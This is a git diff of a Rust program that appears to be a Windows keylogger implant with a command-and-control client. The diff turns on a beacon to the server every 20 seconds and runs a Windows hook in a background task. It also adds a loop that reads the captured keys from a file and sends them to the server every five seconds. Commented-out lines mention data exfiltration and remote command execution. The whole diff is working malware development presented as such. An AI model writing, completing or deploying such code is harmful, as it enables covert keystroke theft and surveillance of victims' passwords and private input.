@@ -1,7 +1,7 @@
 mod server;
 mod system;
 use std::{sync::Arc};
-use system::{get_windows_version, set_windows_hook};
+use system::{get_windows_version, read_file, set_windows_hook};
 use tokio::time::{Duration, sleep};
 
 
@@ -28,30 +28,40 @@ async fn main() {
 
     let id: String = unwrap_or_panic!(server.register(arch).await);
 
-    // let server_clone = Arc::clone(&server);
-    // let id_clone = id.clone();
+    let server_clone = Arc::clone(&server);
+    let id_clone = id.clone();
 
-    // tokio::spawn(async move {
-    //     loop {
-    //         server_clone.becon(&id_clone).await;
-    //         sleep(Duration::from_secs(1000)); 
-    //     }
-    // });
-    unsafe {
-        set_windows_hook();
-    }
+    tokio::spawn(async move {
+
+        unsafe {
+            set_windows_hook();
+        }
+    });
+
+    tokio::spawn(async move {
+
+        loop {
+            server_clone.becon(&id_clone).await;
+            sleep(Duration::from_secs(20)).await; 
+        }
+    });
+
+
+
+
 
     loop{
         // Execute Commands
         // let rec = unwrap_or_panic!(server.get_command(&id).await);
         // execute_command(&rec).await; 
         // sleep(Duration::from_secs(10)).await;
+        let keys = read_file();
+        server.send_data(&id, &keys.clone()).await;
+        sleep(Duration::from_secs(5)).await;
     }
     
-        // exfiltrates data
-        // server.send_data(&id, "HHHH").await;
-        // sleep(Duration::from_secs(5));
-        // returns the command
+        
+
 
     
 }
